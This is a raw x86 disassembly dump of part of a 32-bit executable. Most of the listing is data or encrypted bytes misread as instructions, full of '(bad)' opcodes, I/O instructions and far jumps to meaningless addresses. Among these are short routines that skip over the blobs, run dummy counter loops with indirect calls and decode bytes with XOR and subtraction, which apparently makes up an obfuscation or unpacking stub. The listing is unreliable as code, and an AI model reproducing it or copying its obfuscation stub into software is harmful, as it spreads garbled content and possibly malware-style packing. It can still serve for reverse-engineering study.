  4063b6:	ret    
  4063b7:	idiv   bh
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x2ae0,0xef
  4063d1:	ss pop ecx
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x406416
  4063dc:	push   edi
  4063dd:	jae    0x4063d5
  4063df:	push   ebp
  4063e0:	in     eax,dx
  4063e1:	jge    0x40641b
  4063e3:	sbb    al,BYTE PTR [esi]
  4063e5:	push   cs
  4063e6:	cwde   
  4063e7:	repnz loop 0x406468
  4063ea:	retf   
  4063eb:	push   edi
  4063ec:	(bad)  
  4063ed:	js     0x4063d0
  4063ef:	bound  esi,QWORD PTR [edi]
  4063f1:	movntq QWORD PTR [ebx+0x3d],mm2
  4063f5:	fsub   DWORD PTR [ebp+0x2c5eafa6]
  4063fb:	xor    al,0x6d
  4063fd:	mov    eax,0xf53f8376
  406402:	jnp    0x40638c
  406404:	sbb    DWORD PTR [ebx+eiz*8],edi
  406407:	xor    bl,BYTE PTR [ebp*1+0x41b5cc52]
  40640e:	mov    eax,0xa59e1e5b
  406413:	mov    bl,0x8f
  406415:	idiv   DWORD PTR [edi]
  406417:	shl    DWORD PTR [ecx+0x3356e8b5],0xf9
  40641e:	fcom   QWORD PTR [esi]
  406420:	mov    bh,0x8e
  406422:	add    al,0xd6
  406424:	mov    DWORD PTR [eax-0x5caadbd],ecx
  40642a:	xchg   ebx,eax
  40642b:	enter  0x9a02,0x32
  40642f:	jnp    0x406451
  406431:	test   eax,0x12560078
  406436:	jne    0x406450
  406438:	xchg   ecx,eax
  406439:	xchg   BYTE PTR [edi],dh
  40643b:	or     cl,BYTE PTR [esi-0x2dababe4]
  406441:	pop    eax
  406442:	adc    edx,DWORD PTR [eax]
  406444:	jecxz  0x406416
  406446:	xchg   ecx,ebp
  406448:	pop    ds
  406449:	loopne 0x40642d
  40644b:	jp     0x40643e
  40644d:	out    0xfa,eax
  40644f:	(bad)  
  406450:	pop    ss
  406451:	xchg   BYTE PTR ds:[esi-0x72],bh
  406455:	outs   dx,BYTE PTR ds:[esi]
  406456:	stos   DWORD PTR es:[edi],eax
  406457:	xchg   edi,eax
  406458:	pop    edi
  406459:	sbb    eax,0x2f544ad9
  40645e:	stc    
  40645f:	xor    ebx,DWORD PTR [esi]
  406461:	adc    bh,0x60
  406464:	mov    cl,0x6f
  406466:	push   ecx
  406467:	hlt    
  406468:	and    esi,ebx
  40646a:	cmp    al,0x2d
  40646c:	pop    ebp
  40646d:	outs   dx,DWORD PTR ds:[esi]
  40646e:	ins    DWORD PTR es:[edi],dx
  40646f:	sahf   
  406470:	jo     0x406411
  406472:	pop    ebx
  406473:	fnstcw WORD PTR [esi-0x3a]
  406476:	cmp    esi,DWORD PTR [ebp+0x413648ce]
  40647c:	cmc    
  40647d:	xchg   BYTE PTR [edx-0x38],dl
  406480:	xchg   edx,eax
  406481:	jecxz  0x4064bd
  406483:	pop    ebx
  406484:	not    DWORD PTR [eax-0xcf6d131]
  40648a:	dec    esi
  40648b:	mov    dh,0x4f
  40648d:	xor    DWORD PTR [eax-0x3f],ecx
  406490:	jno    0x406502
  406492:	xchg   edx,eax
  406493:	in     al,dx
  406494:	cmp    edi,DWORD PTR [edx]
  406496:	push   cs
  406497:	mov    eax,0x17b083d8
  40649c:	mov    WORD PTR [edi-0x26],cs
  40649f:	pop    edx
  4064a0:	mov    ebx,0x84445848
  4064a5:	sbb    eax,0x6836e99
  4064aa:	in     eax,0x17
  4064ac:	shr    DWORD PTR [edi-0x20b254c1],0xf0
  4064b3:	pop    esp
  4064b4:	lock leave 
  4064b6:	mov    ecx,0x20ceeeca
  4064bb:	push   edx
  4064bc:	adc    eax,0x9ce42a43
  4064c1:	or     BYTE PTR [ebx-0x45a21cfd],ch
  4064c7:	sbb    ch,dl
  4064c9:	rcr    DWORD PTR [esi],0xab
  4064cc:	pop    eax
  4064ce:	ret    
  4064cf:	(bad)  
  4064d0:	mov    dh,0x5f
  4064d2:	aad    0x86
  4064d4:	and    DWORD PTR [esi-0x31c08c94],edx
  4064da:	ja     0x40653e
  4064dc:	icebp  
  4064dd:	outs   dx,DWORD PTR ds:[esi]
  4064de:	xor    eax,DWORD PTR [ebx-0x475e9b83]
  4064e4:	test   BYTE PTR cs:[esi],0x7e
  4064e8:	adc    dl,BYTE PTR [ebp-0x7631ba8a]
  4064ee:	scas   al,BYTE PTR es:[edi]
  4064ef:	bound  ebp,QWORD PTR [ecx-0x6d]
  4064f2:	cmp    al,0xc2
  4064f4:	dec    ecx
  4064f5:	mov    WORD PTR [esi],ds
  4064f7:	add    eax,0x22db3b82
  4064fc:	push   ebx
  4064fd:	jo     0x4064ce
  4064ff:	lods   al,BYTE PTR ds:[esi]
  406500:	out    0x5f,al
  406502:	aaa    
  406503:	rol    DWORD PTR [ebx+0x25],0xd4
  406507:	or     DWORD PTR [esi],0x9
  40650a:	sbb    al,0xa6
  40650c:	jmp    0x749b:0x12c656f5
  406513:	cs (bad) 
  406515:	cwde   
  406516:	jle    0x40650e
  406518:	pop    ecx
  406519:	dec    edi
  40651a:	sbb    esi,edx
  40651c:	addr16 inc eax
  40651e:	cwde   
  40651f:	(bad)  
  406520:	jmp    edi
  406522:	inc    edi
  406523:	int    0xa4
  406525:	ja     0x40659e
  406527:	mov    ?,WORD PTR [edi*2-0x1ae27739]
  40652e:	mov    bh,0xca
  406530:	and    DWORD PTR [esi],ecx
  406532:	mov    ds:0x538b12f7,eax
  406537:	jns    0x40656f
  406539:	mov    ebx,0x7375780e
  40653e:	loope  0x40657c
  406540:	int3   
  406541:	ja     0x4064dd
  406543:	pushf  
  406544:	sub    eax,0x8273a099
  406549:	sub    BYTE PTR [eax-0x35],bl
  40654c:	(bad)  
  40654e:	cmp    DWORD PTR [ecx],ebp
  406550:	loop   0x4064e1
  406552:	scas   eax,DWORD PTR es:[edi]
  406553:	icebp  
  406554:	inc    ebp
  406555:	out    0x9a,al
  406557:	sti    
  406558:	pop    ds
  406559:	cs std 
  40655b:	push   edi
  40655c:	cdq    
  40655d:	adc    BYTE PTR [edx-0xb0104df],bl
  406563:	xor    dl,BYTE PTR ds:0xfe20f159
  406569:	(bad)  
  40656a:	scas   eax,DWORD PTR es:[edi]
  40656b:	out    0x15,al
  40656d:	outs   dx,BYTE PTR ds:[esi]
  40656e:	sub    DWORD PTR [eax-0x439d5d7d],esp
  406574:	mov    dl,BYTE PTR [edi+0x73d6ae7c]
  40657a:	mov    bh,0xa9
  40657c:	mov    ds:0xeeefd074,eax
  406581:	div    BYTE PTR [esi+0x67]
  406584:	out    0xab,eax
  406586:	aad    0x6c
  406588:	mov    al,BYTE PTR [edi]
  40658a:	loope  0x40655b
  40658c:	pop    ss
  40658d:	call   0x757c:0x8bcfe24a
  406594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406595:	test   esp,ecx
  406597:	sti    
  406598:	dec    edx
  406599:	lods   eax,DWORD PTR ds:[esi]
  40659a:	out    0xda,eax
  40659c:	push   0x6f
  40659e:	(bad)  
  40659f:	hlt    
  4065a0:	dec    ebx
  4065a1:	mov    ch,0x8c
  4065a3:	popf   
  4065a4:	dec    eax
  4065a5:	jb     0x406602
  4065a7:	pop    edi
  4065a8:	or     esp,DWORD PTR [esi-0x4997855b]
  4065ae:	and    BYTE PTR [ebx-0x378665f8],bl
  4065b4:	popaw  
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x7b334ed2]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x4065e9
  40660b:	loope  0x40663a
  40660d:	or     cl,BYTE PTR [ecx+0x78]
  406610:	adc    ebp,DWORD PTR [edi]
  406612:	inc    esp
  406613:	xor    BYTE PTR [eax+edx*1+0x50],al
  406617:	add    ebp,esp
  406619:	out    0x4c,eax
  40661b:	xor    DWORD PTR [ecx+0x14],0x5810fef5
  406622:	enter  0x2a66,0x63
  406626:	rcr    BYTE PTR [esi],cl
  406628:	sbb    al,0x8b
  40662a:	add    edx,DWORD PTR [ebx+0x3]
  40662d:	shl    BYTE PTR [ebx],0x5b
  406630:	cwde   
  406631:	lods   eax,DWORD PTR ds:[esi]
  406632:	out    0x7a,eax
  406634:	gs pop ecx
  406636:	rcr    DWORD PTR [esi],0x43
  406639:	xchg   BYTE PTR [edi],al
  40663b:	pushf  
  40663c:	xchg   esi,eax
  40663d:	adc    eax,0x7bb78441
  406642:	xchg   esi,eax
  406643:	mov    dh,0x85
  406645:	pop    esi
  406646:	mov    esi,0xfd48968b
  40664b:	mov    ecx,?
  40664d:	nop
  40664e:	test   eax,0x1efff6c5
  406653:	mov    cl,0x3d
  406655:	sub    BYTE PTR ds:0xa906b0ea,bl
  40665b:	lds    esp,FWORD PTR [ebx]
  40665d:	into   
  40665e:	push   ebp
  40665f:	xchg   esi,eax
  406660:	(bad)  
  406661:	loop   0x40665a
  406663:	shr    BYTE PTR [ecx+0x2cad5398],0xbc
  40666a:	pop    ecx
  40666b:	por    mm1,QWORD PTR [esp+ebx*1]
  40666f:	lods   al,BYTE PTR ds:[esi]
  406670:	jle    0x406685
  406672:	in     eax,0xda
  406674:	sti    
  406675:	pminsw mm3,QWORD PTR [esi]
  406678:	add    BYTE PTR [ebx+0x3],0x3f
  40667c:	adc    esi,esi
  40667e:	mov    ecx,0xc2dcaa0e
  406683:	inc    ebx
  406684:	les    edi,FWORD PTR [edx-0x5e]
  406687:	(bad)  
  406688:	vpmaxub xmm5,xmm5,XMMWORD PTR [esi-0x67]
  40668d:	pop    esi
  40668e:	rcr    eax,0xdd
  406691:	mov    ch,0x35
  406693:	or     eax,0x71b74e1f
  406698:	aaa    
  406699:	push   esi
  40669a:	sbb    dh,BYTE PTR [esi+ebx*4-0xd]
  40669e:	or     BYTE PTR [edi+0x3d663562],bl
  4066a4:	jle    0x406649
  4066a6:	clc    
  4066a7:	fbld   TBYTE PTR [esi+0x4c9593bb]
  4066ad:	es pop es
  4066af:	(bad)  
  4066b0:	lock sbb ecx,DWORD PTR [ebx+edi*1-0x60b76500]
  4066b8:	cwde   
  4066b9:	lea    ebp,[edx+0x12]
  4066bc:	or     eax,0x5683ad31
  4066c1:	cmp    DWORD PTR fs:[edi],ecx
  4066c4:	mov    eax,ds:0x79575b62
  4066c9:	fcom   QWORD PTR [ecx+0x77826a9b]
  4066cf:	dec    esp
  4066d0:	push   0x31e77f0
  4066d5:	(bad)  
  4066d7:	aam    0xc0
  4066d9:	cli    
  4066da:	mov    DWORD PTR [eax+ecx*4-0x15],edx
  4066de:	push   esi
  4066df:	and    BYTE PTR [ebx+0x241b9563],dh
  4066e5:	mov    ah,0x6a
  4066e7:	or     BYTE PTR [ebp-0x2e],0x0
  4066eb:	sbb    eax,0x3b1101bb
  4066f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f1:	pop    ds
  4066f2:	mov    esp,0x80ee1221
  4066f7:	retf   0x1b6b
  4066fa:	push   ss
  4066fb:	pop    ss
  4066fc:	mov    edx,0xd517ff52
  406701:	lahf   
  406702:	je     0x40674e
  406704:	rcl    DWORD PTR [edi+0x55],cl
  406707:	out    0x54,ax
  40670a:	(bad)  
  40670b:	mov    dl,0x8f
  40670d:	cmp    BYTE PTR [ebx],al
  40670f:	mov    ebp,0x4bbb3b64
  406714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406715:	das    
  406716:	mov    ?,esi
  406718:	push   es
  406719:	push   0xbfc41ac5
  40671e:	pop    eax
  40671f:	out    dx,al
  406720:	adc    eax,ebx
  406722:	dec    esp
  406723:	push   cs
  406724:	les    ecx,FWORD PTR [ebx-0x1803e1cd]
  40672a:	sbb    DWORD PTR [edx-0x4ffff06e],ecx
  406730:	stos   DWORD PTR es:[edi],eax
  406731:	add    DWORD PTR [ecx+0x2f6dbc88],ebp
  406737:	sub    eax,0x819e882c
  40673c:	dec    esi
  40673d:	xlat   BYTE PTR ds:[ebx]
  40673e:	push   edi
  40673f:	ja     0x40671f
  406741:	(bad)  
  406742:	arpl   WORD PTR [ebp-0x157dbe3],si
  406748:	inc    ecx
  406749:	pop    ebp
  40674a:	fs dec ebp
  40674c:	(bad)
  40674f:	jmp    0xf15ddd50
  406754:	fbstp  TBYTE PTR [eax+0x61]
  406757:	mov    esp,0x2e643d8b
  40675c:	and    bh,BYTE PTR [ebx-0x39]
  40675f:	je     0x4066f2
  406761:	(bad)  
  406763:	psubusb mm7,QWORD PTR ds:0x8c3ddc9e
  40676a:	nop
  40676b:	or     bh,BYTE PTR [eax-0x60]
  40676e:	call   0xf7fa:0xd675df80
  406775:	dec    edx
  406776:	js     0x40671c
  406778:	dec    esp
  406779:	cmp    DWORD PTR [edx+0x7c],ebp
  40677c:	pop    esi
  40677d:	std    
  40677e:	xor    BYTE PTR es:[ebp-0x329eceb8],0xa3
  406786:	fidiv  DWORD PTR [eax+0x53]
  406789:	call   0x5ec21f58
  40678e:	scas   al,BYTE PTR es:[edi]
  40678f:	sbb    DWORD PTR [ebx],eax
  406791:	add    bh,BYTE PTR [ebp+0x24]
  406794:	nop
  406795:	rol    DWORD PTR [ebp-0x6cbfd5e6],1
  40679b:	int    0xb8
  40679d:	xor    ch,dl
  40679f:	xor    edx,DWORD PTR [ebx]
  4067a1:	aas    
  4067a2:	imul   esi,DWORD PTR [eax],0xb1b648e7
  4067a8:	pop    edx
  4067a9:	sbb    eax,0x3acaf548
  4067ae:	mov    dh,0x15
  4067b0:	ja     0x406755
  4067b2:	mov    ds:0x613af007,eax
  4067b7:	loopne 0x406765
  4067b9:	xor    esi,DWORD PTR [ebx]
  4067bb:	push   es
  4067bc:	sbb    eax,0x3cdac188
  4067c1:	jle    0x406770
  4067c3:	pusha  
  4067c4:	sub    BYTE PTR [ecx],cl
  4067c6:	idiv   BYTE PTR [ecx]
  4067c8:	fistp  DWORD PTR [ebx+0x7f]
  4067cb:	push   edx
  4067cc:	loop   0x406805
  4067ce:	(bad)
  4067d1:	cld    
  4067d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d3:	(bad)  
  4067d4:	loope  0x40683e
  4067d6:	addr16 inc esp
  4067d8:	xchg   edx,eax
  4067d9:	dec    esp
  4067da:	jl     0x40678b
  4067dc:	hlt    
  4067dd:	fstp   QWORD PTR [edx-0xa4326bf]
  4067e3:	mov    bl,BYTE PTR [ebx-0x48]
  4067e6:	gs (bad) 
  4067e8:	int    0xff
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xff30:0xbda0f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	cmc    
  406865:	int    0x60
  406867:	repz mov dl,BYTE PTR [edx]
  40686a:	cmp    eax,0x66e7007f
  40686f:	xchg   esp,eax
  406870:	ret    
  406871:	(bad)  
  406875:	mov    bl,0x29
  406877:	mov    cl,0x6c
  406879:	ret    
  40687a:	jae    0x406878
  40687c:	(bad)  [esi-0x573190b1]
  406882:	sbb    eax,0xcfb23d03
  406887:	imul   esi,ebp,0x79
  40688a:	cmp    ecx,edx
  40688c:	shl    DWORD PTR [edx],1
  40688e:	sub    eax,0xb3b847e9
  406893:	add    ecx,DWORD PTR [edx]
  406895:	scas   al,BYTE PTR es:[edi]
  406896:	dec    edx
  406897:	lds    ecx,FWORD PTR [ebx]
  406899:	cdq    
  40689a:	or     bl,ch
  40689c:	and    BYTE PTR [eax+0x73],bl
  40689f:	and    al,0xd5
  4068a1:	and    DWORD PTR [eax],esi
  4068a3:	fstp   DWORD PTR [edx-0xb]
  4068a6:	mov    eax,0x54063a94
  4068ab:	(bad)  
  4068ac:	call   0x1dd66b34
  4068b1:	out    dx,eax
  4068b2:	adc    edx,DWORD PTR [ebx+ebx*1+0x17]
  4068b6:	pop    eax
  4068b7:	inc    DWORD PTR [eax]
  4068b9:	sub    ecx,DWORD PTR [esp+edi*1-0x42b73638]
  4068c0:	mov    bl,0xa4
  4068c2:	rol    edx,0xba
  4068c5:	das    
  4068c6:	(bad)  
  4068c7:	xor    al,cl
  4068c9:	test   ah,cl
  4068cb:	inc    edx
  4068cc:	cdq    
  4068cd:	xor    BYTE PTR [edx-0x998fdd7],bh
  4068d3:	lods   eax,DWORD PTR ds:[esi]
  4068d4:	push   ebx
  4068d5:	stos   BYTE PTR es:[edi],al
  4068d6:	test   al,0x73
  4068d8:	push   esp
  4068d9:	(bad)
  4068dd:	enter  0xf40a,0x1c
  4068e1:	jne    0x40688c
  4068e3:	jmp    0x2d3170fa
  4068e8:	out    dx,eax
  4068e9:	mov    dl,0x34
  4068eb:	cmp    ch,BYTE PTR [ecx]
  4068ed:	push   es
  4068ee:	dec    ebp
  4068ef:	mov    BYTE PTR [eax-0x36],dh
  4068f2:	mov    al,ds:0x49f00e74
  4068f7:	mov    al,ds:0x2d35dfa8
  4068fc:	ficomp DWORD PTR [edi]
  4068fe:	fild   DWORD PTR [edi+0x21e72b11]
  406904:	xchg   esp,eax
  406905:	setns  bh
  406908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406909:	or     DWORD PTR [ebp-0x57],0xffffffcd
  40690d:	call   DWORD PTR [eax+0x76]
  406910:	call   0x1fa8:0xb4ac2055
  406917:	clc    
  406918:	fdiv   QWORD PTR [ecx+0x33]
  40691b:	dec    DWORD PTR [ebx]
  40691d:	ins    DWORD PTR es:[edi],dx
  40691e:	push   ebp
  40691f:	or     BYTE PTR [eax+0x46abe276],al
  406925:	cmp    DWORD PTR [eax+ecx*1+0x61427912],0xaebcdc10
  406930:	push   eax
  406931:	or     ebp,DWORD PTR [edi-0x6fa060c9]
  406937:	dec    esp
  406938:	cwde   
  406939:	pushf  
  40693a:	inc    ecx
  40693b:	jo     0x406972
  40693d:	sbb    BYTE PTR [edi+0x43],0x7c
  406941:	dec    ebx
  406942:	(bad)  
  406943:	iret   
  406944:	fnstcw WORD PTR [esi]
  406946:	xor    BYTE PTR [ecx],al
  406948:	pop    edi
  406949:	mov    ah,BYTE PTR [esi]
  40694b:	call   0xc8b0:0x8aee33af
  406952:	aam    0x10
  406954:	jno    0x4069b2
  406956:	push   ebp
  406957:	cmp    DWORD PTR [edx],eax
  406959:	sbb    esi,DWORD PTR [edx+0x23]
  40695c:	(bad)  
  40695d:	std    
  40695e:	inc    ch
  406960:	ja     0x406975
  406962:	dec    esp
  406963:	rol    dl,cl
  406965:	mov    cl,0xa7
  406967:	ins    DWORD PTR es:[edi],dx
  406968:	mov    ds:0x79e6470,al
  40696d:	mov    ch,0x4
  40696f:	mov    esp,DWORD PTR [eax]
  406971:	dec    ebx
  406972:	aad    0x4c
  406974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406975:	into   
  406976:	sbb    eax,0x24e68db8
  40697b:	lahf   
  40697c:	ja     0x4069af
  40697e:	in     al,0x4d
  406980:	ins    BYTE PTR es:[edi],dx
  406981:	ror    BYTE PTR [edi+0x112d78ce],cl
  406987:	mov    cl,BYTE PTR [ebx+0x6f2addfb]
  40698d:	ror    cl,0xd8
  406990:	sbb    BYTE PTR [esi],ah
  406992:	push   esi
  406993:	shl    bl,0xe1
  406996:	adc    eax,0x578f91c1
  40699b:	add    eax,0x49942fa0
  4069a0:	jge    0x406a01
  4069a2:	cs mov edi,gs
  4069a5:	mov    esi,0x9ecac4fa
  4069aa:	out    0x70,al
  4069ac:	mov    dl,0xb1
  4069ae:	ror    DWORD PTR [ebp+0x3d],1
  4069b1:	push   edi
  4069b2:	xchg   ecx,eax
  4069b3:	icebp  
  4069b4:	mov    ah,0xcd
  4069b6:	xor    ebp,edx
  4069b8:	pusha  
  4069b9:	adc    DWORD PTR [esi],edi
  4069bb:	add    eax,0xa904573e
  4069c0:	in     eax,dx
  4069c1:	sbb    esi,DWORD PTR [eax]
  4069c3:	xor    BYTE PTR [ecx-0x38],al
  4069c6:	shl    ch,1
  4069c8:	mov    edx,0x412db8ae
  4069cd:	push   ds
  4069ce:	cmp    ecx,DWORD PTR [ebx-0x7f]
  4069d1:	das    
  4069d2:	lods   al,BYTE PTR ds:[esi]
  4069d3:	mov    edx,0x95538cfd
  4069d8:	sbb    BYTE PTR [edx+eiz*4],bh
  4069db:	fist   DWORD PTR [ecx-0x72]
  4069de:	mov    ds:0x9c9692c2,al
  4069e3:	test   eax,0xf6d4136b
  4069e8:	in     al,dx
  4069e9:	gs xor edi,ecx
  4069ec:	push   edx
  4069ed:	pusha  
  4069ee:	add    eax,DWORD PTR [ecx-0x6b]
  4069f1:	xchg   ebp,eax
  4069f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f3:	mov    al,0xdc
  4069f5:	mov    eax,0x1c1411a5
  4069fa:	jno    0x4069a3
  4069fc:	call   0xb83552a2
  406a01:	nop
  406a02:	fisub  WORD PTR [ebx-0x20e64393]
  406a08:	nop
  406a09:	add    eax,0xcc0515c8
  406a0e:	xchg   edi,esi
  406a10:	imul   eax,DWORD PTR [eax],0xca485dd1
  406a16:	sbb    DWORD PTR [ebx+ebx*4],esi
  406a19:	popa   
  406a1a:	jne    0x4069be
  406a1c:	jo     0x406a1a
  406a1e:	add    al,0x7e
  406a20:	sti    
  406a21:	daa    
  406a22:	xor    edi,edx
  406a24:	mov    es,WORD PTR [esp+edi*1-0xa0c3d41]
  406a2b:	cs aad 0x73
  406a2e:	xor    edi,DWORD PTR [esi+0x7]
  406a31:	add    eax,0xd77787d4
  406a36:	or     DWORD PTR [eax+0x9],edx
  406a39:	push   ebx
  406a3a:	popa   
  406a3b:	xchg   ebx,eax
  406a3c:	repnz mov bl,0x66
  406a3f:	pop    eax
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x43035f,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x4302b5,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x430357,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x430357
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x430357,ecx
  406b87:	cmp    DWORD PTR ds:0x430357,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x430357,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e666
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x621f7504
  406bfe:	retf   
  406bff:	add    DWORD PTR [ebp+0x3a],esp
  406c02:	jle    0x406c82
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c5d
  406c09:	imul   edx,DWORD PTR [esi+0x5d],0xda85ca3f
  406c10:	(bad)  [ebx+0x43]
  406c13:	sbb    DWORD PTR [ebx+ecx*1+0x1],0xffffffe6
  406c18:	ret    0x885c
  406c1b:	push   cs
  406c1c:	or     esi,ebx
  406c1e:	nop
  406c1f:	jmp    ebp
  406c21:	je     0x406c50
  406c23:	retf   0xcd4c
  406c26:	mov    ds:0xee81d3fa,al
  406c2b:	and    ecx,DWORD PTR [ebp+eax*1-0x5f]
  406c2f:	xor    BYTE PTR [esi-0x77],cl
  406c32:	idiv   DWORD PTR [eax+0x5a]
  406c35:	cmp    edi,DWORD PTR [edx]
  406c37:	mov    ds:0x3f02eaf8,al
  406c3c:	int    0x99
  406c3e:	add    dl,ch
  406c40:	mov    cs,WORD PTR [esi-0x1f717b2a]
  406c46:	ret    
